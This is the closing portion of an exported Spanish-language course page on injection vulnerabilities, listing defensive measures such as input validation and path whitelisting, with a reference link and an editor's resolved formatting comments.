</li></ul><ul id="88964adc-f609-41c4-8a5b-d58c2e47c72e" class="bulleted-list"><li style="list-style-type:disc">Asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido.</li></ul><ul id="9c9b5673-1e97-4bdb-98f6-6586578eaa5e" class="bulleted-list"><li style="list-style-type:disc">Utilizar una capa de seguridad adicional, como una lista blanca de rutas permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</li></ul><ul id="bf55caf3-ee3c-44cd-b4b0-0ad941b1108d" class="bulleted-list"><li style="list-style-type:disc">Restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.</li></ul><ul id="8818f89c-8892-4321-9d76-2fda6110d112" class="bulleted-list"><li style="list-style-type:disc">Utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas.</li></ul><ul id="b9a688b2-79be-4f66-b5b3-14a5115f066c" class="bulleted-list"><li style="list-style-type:disc">También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</li></ul><p id="1618a6d4-4b61-4a74-a771-024366337dd5" class=""> </p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="dbccb476-1e25-4be4-8491-75acb7660b7e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><mark class="highlight-blue">Los tipos de Inyección mas comunes como por ejemplo el XSS (Cross Site Scripting) y el SQLi (SQL Injection) son tan profundos y comunes que les hemos dado módulos específicos dentro del curso, los cuales vienen a continuación</mark></div></figure><p id="905574a0-236e-4f67-9a19-c6dc031f2e31" class="">
+</p><h2 id="0ae73c24-a22b-4767-b46a-08b4205f279d" class="">Enlaces de Referencia:</h2><figure id="d98d72d1-20ec-465d-9958-f5260f286a51"><a href="https://hackersonlineclub.com/command-injection-cheatsheet/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Command Injection Cheatsheet</div><div class="bookmark-description">Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers, etc.)</div></div><div class="bookmark-href"><img src="https://hackersonlineclub.com/wp-content/uploads/2018/08/cropped-HOC-Favicon-192x192.png" class="icon bookmark-icon"/>https://hackersonlineclub.com/command-injection-cheatsheet/</div></div><img src="https://hackersonlineclub.com/wp-content/uploads/2019/03/Command-Injection-Cheatsheet-1.png" class="bookmark-image"/></a></figure><p id="8c805176-4b06-43ce-890d-b56cf9ade9a6" class="">
+</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"><hr/><details open="" style="padding-top:1em"><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Resolved inline comments</summary><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"><mark class="highlight-blue">Los tipos de Inyección mas comunes como por ejemplo el XSS (Cross Site Scripting) y el SQLi (SQL Injection) son tan profundos y comunes que les hemos dado módulos específicos dentro del curso; en este Módulo hablaremos de los demás tipos de inyección.</mark></mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 1:58 PM</time></span></span></div><div style="padding:0.2em">Encerrarlo en un cuadro e incluir el ícono de la mano </div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"> </mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:19 PM</time></span></span></div><div style="padding:0.2em">Darle un preambulo a la imagen. Ej. “A continuacion, se enuncia….” </div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 2:06 PM</time></span></span></div><div style="padding:0.2em">Incluir nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Prevención</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:04 PM</time></span></span></div><div style="padding:0.2em">Va en título 3</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Un ejemplo de cómo prevenir el code injection es validar los datos de entrada del usuario para asegurarse de que contengan sólo los caracteres permitidos. Por ejemplo, si un campo de entrada debe contener sólo números, la aplicación web debe asegurarse de que el campo no contenga caracteres alfabéticos o especiales. Si un campo de entrada debe contener sólo texto, la aplicación web debe asegurarse de que el campo no contenga caracteres numéricos o especiales. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:47 PM</time></span></span></div><div style="padding:0.2em">Organizarl el texto con bullets y agregar otra prevención.</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Un ejemplo de cómo prevenir el code injection es validar los datos de entrada del usuario para asegurarse de que contengan sólo los caracteres permitidos. Por ejemplo, si un campo de entrada debe contener sólo números, la aplicación web debe asegurarse de que el campo no contenga caracteres alfabéticos o especiales. Si un campo de entrada debe contener sólo texto, la aplicación web debe asegurarse de que el campo no contenga caracteres numéricos o especiales. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:47 PM</time></span></span></div><div style="padding:0.2em">Organizarl el texto con bullets y agregar otra prevención.</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Un ejemplo de cómo prevenir el code injection es validar los datos de entrada del usuario para asegurarse de que contengan sólo los caracteres permitidos. Por ejemplo, si un campo de entrada debe contener sólo números, la aplicación web debe asegurarse de que el campo no contenga caracteres alfabéticos o especiales. Si un campo de entrada debe contener sólo texto, la aplicación web debe asegurarse de que el campo no contenga caracteres numéricos o especiales. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:47 PM</time></span></span></div><div style="padding:0.2em">Organizarl el texto con bullets y agregar otra prevención.</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"> </mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:19 PM</time></span></span></div><div style="padding:0.2em">Darle un preambulo a la imagen. Ej. “A continuacion, se enuncia….” </div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 2:43 PM</time></span></span></div><div style="padding:0.2em">Incluir nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">utilizan </mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:12 PM</time></span></span></div><div style="padding:0.2em">Cambiar por un sinonimo. Ej.  “usar”. Se repite mas de 1 vez en el párrafo.</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:01 PM</time></span></span></div><div style="padding:0.2em">Incluir nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"> una guía</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:17 PM</time></span></span></div><div style="padding:0.2em">Cambia por “un”</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"> </mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:23 PM</time></span></span></div><div style="padding:0.2em">Darle un preambulo a la imagen. Ej. “A continuacion, se enuncia….” </div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:02 PM</time></span></span></div><div style="padding:0.2em">Incluir nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:02 PM</time></span></span></div><div style="padding:0.2em">Incluir nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:57 PM</time></span></span></div><div style="padding:0.2em">Darle un nombre a la imagen </div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Para prevenir la inyección de archivos locales, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de rutas permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.<br/><br/>También es importante restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.<br/><br/>Asimismo, es importante utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas. También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:00 PM</time></span></span></div><div style="padding:0.2em">Dejarlos en bullets o lista</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Para prevenir la inyección de archivos locales, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de rutas permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.<br/><br/>También es importante restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.<br/><br/>Asimismo, es importante utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas. También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:00 PM</time></span></span></div><div style="padding:0.2em">Dejarlos en bullets o lista</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Para prevenir la inyección de archivos locales, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de rutas permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.<br/><br/>También es importante restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.<br/><br/>Asimismo, es importante utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas. También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:00 PM</time></span></span></div><div style="padding:0.2em">Dejarlos en bullets o lista</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Para prevenir la inyección de archivos locales, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de rutas permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.<br/><br/>También es importante restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.<br/><br/>Asimismo, es importante utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas. También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:00 PM</time></span></span></div><div style="padding:0.2em">Dejarlos en bullets o lista</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Para prevenir la inyección de archivos locales, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de rutas permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.<br/><br/>También es importante restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.<br/><br/>Asimismo, es importante utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas. También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:00 PM</time></span></span></div><div style="padding:0.2em">Dejarlos en bullets o lista</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Para prevenir la inyección de archivos locales, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de rutas permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.<br/><br/>También es importante restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.<br/><br/>Asimismo, es importante utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas. También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:00 PM</time></span></span></div><div style="padding:0.2em">Dejarlos en bullets o lista</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background">Para prevenir la inyección de archivos locales, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de rutas permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.<br/><br/>También es importante restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.<br/><br/>Asimismo, es importante utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas. También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:00 PM</time></span></span></div><div style="padding:0.2em">Dejarlos en bullets o lista</div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><p style="padding:0.2em"><b>Block text</b>: <mark class="highlight-yellow_background"> </mark></p><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 4:11 PM</time></span></span></div><div style="padding:0.2em"><strong>OBSERVACIÓN </strong>En teoría tendrían que ir en este modulo los dos tipos de Inyección que faltan. XSS Y SQL. Los veo en los siguientes mósulos.                                         Recomiendo dejar un texto aclaratorio para los ultimos dos módulo. </div><div style="padding:0.3em"></div></li></ul></div><hr/></div><div class="indented"><div><ul class="toggle"><li><div><span class="user" style="padding:0.2em"><span class="icon text-icon user-icon"><span class="user-icon-inner">A</span></span><span><b>AGutier</b> <time style="font-size:0.8em">Jun 13, 2023, 3:01 PM</time></span></span></div><div style="padding:0.2em">Incluir nombre a la imagen</div><div style="padding:0.3em"></div></li></ul></div><hr/></div></details></span></body></html>
